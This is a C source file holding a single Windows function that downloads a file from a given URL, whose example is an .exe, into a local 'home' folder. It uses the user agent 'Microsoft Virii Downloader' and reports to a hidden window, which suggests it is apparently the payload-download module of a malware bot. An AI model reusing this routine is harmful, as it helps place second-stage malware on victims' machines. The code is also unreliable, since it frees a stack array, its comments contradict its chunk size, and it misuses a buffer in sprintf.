#include <windows.h>
#include <wininet.h>
#include <winsock.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <process.h>
#include "main.h"
extern char *home;
extern HWND hwnd;
extern int debug_on;

BOOL GetFile (   CHAR *argQz )  //this has the url http://blah.com/~drgreen/file.exe and the last thing a checksum
{
   	char *szUrl = malloc(450);
   	DWORD dwSize;
	CHAR   szHead[] = "Accept: */*\r\n\r\n";
	VOID * szTemp[350];
	HINTERNET  hConnect;
	FILE * pFile;
    char szFileName[200];
	int startdownload = GetTickCount();
 	HINTERNET hOpen;

#ifdef debugg
	if(debug_on == 1)
    {
     log_debug("(Download Thread): Thread Has Started...\r\n");
    }
#endif



	memset(szFileName,0,200);
	strcat(szFileName,home);
	strcat(szFileName,strrchr(argQz,'/')+1);
	memset(szUrl,0,450);
	strcat(szUrl,"http://");
	strcat(szUrl,argQz);




#ifdef debugg
	if(debug_on == 1)
	{
		char *tempQz = malloc(350);
		sprintf(tempQz,"(Download Thread): Remote Url :%s\r\n",szUrl);
		log_debug(tempQz);
		sprintf(tempQz,"(Download Thread): Local File :%s\r\n",szFileName);
		log_debug(tempQz);
		free(tempQz);
	}
#endif


    hOpen = InternetOpen("Microsoft Virii Downloader", INTERNET_OPEN_TYPE_DIRECT,
		0,0,0);
	if(hOpen == 0)
	{
		//return 0;
		SendMessage(hwnd,8481,(WPARAM)"(Download Thread): InternetOpen() failed",0);
		free(szUrl);
		free(szFileName);
		return 0;
//		endthread();
	}



	if ( !(hConnect = InternetOpenUrl ( hOpen, szUrl, szHead,
	lstrlen (szHead), INTERNET_FLAG_DONT_CACHE, 0)))
	{
//		cerr << "Error !" << endl;
		free(szFileName);
		SendMessage(hwnd,8481,(WPARAM)"(Download Thread): InternetOpenUrl() failed",0);
		free(szUrl);
//		endthread();
		return 0;
	}

	if  ( !(pFile = fopen (szFileName, "wb" ) ) )
	{
//		cerr << "Error !" << endl;
//		return FALSE;
		SendMessage(hwnd,8481,(WPARAM)"file creation failed",0);
		free(szFileName);
		return 0;
//		endthread();
	}
	do
	{
		// Keep coping in 25 bytes chunks, while file has any data left.
		// Note: bigger buffer will greatly improve performance.
		if (!InternetReadFile (hConnect, szTemp, 50,  &dwSize) )
		{
			fclose (pFile);
//			cerr << "Error !" << endl;
//			return FALSE;
			SendMessage(hwnd,8481,(WPARAM)"(Download Thread): InternetReadFile() failed",0);
			free(szFileName);
			free(szUrl);
			return 0;
//			endthread();
		}
		if (!dwSize)
			break;  // Condition of dwSize=0 indicate EOF. Stop.
		else
			fwrite(szTemp, sizeof (char), dwSize , pFile);
	}   // do

	while (TRUE);
		fflush (pFile);
		fclose (pFile);

	sprintf(szTemp,"(Download Thread): File %s downloaded in %u seconds",szFileName, ((GetTickCount() - startdownload)/1000));
	SendMessage(hwnd,8481,(WPARAM)&szTemp,0);


	free(szFileName);
	free(szUrl);
	return 1;
//	endthread();
}
